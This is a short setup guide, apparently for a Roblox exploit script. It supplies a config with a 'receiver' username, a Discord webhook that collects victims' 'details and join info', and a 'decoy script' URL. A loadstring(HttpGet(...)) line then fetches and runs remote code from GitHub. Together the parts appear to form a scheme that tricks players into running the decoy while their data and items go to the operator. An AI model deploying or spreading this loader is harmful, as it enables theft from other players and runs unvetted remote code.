🔧 Manual Setup


  
Copy the following code and then update the placeholders with your actual information:


  
Config = {
  Receivers = {"username"},
  Webhook = "Webhook url",
  ScriptURL = "Raw GitHub https",
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()
  


  
🔌 What to Fill In:

  
    
    
  • Receivers: Your Roblox username (⚠️ Not your display name)
    • 
    
  • Webhook: A valid Discord webhook URL — this is where details and join info will be sent.
    • 
    
  • ScriptURL: A raw GitHub URL for the decoy script.
    • 
  


  
⚠️ Make sure the URL is in raw format (https://raw.githubusercontent.com/...) and does not contain a loadstring in the script if you took it from the web.
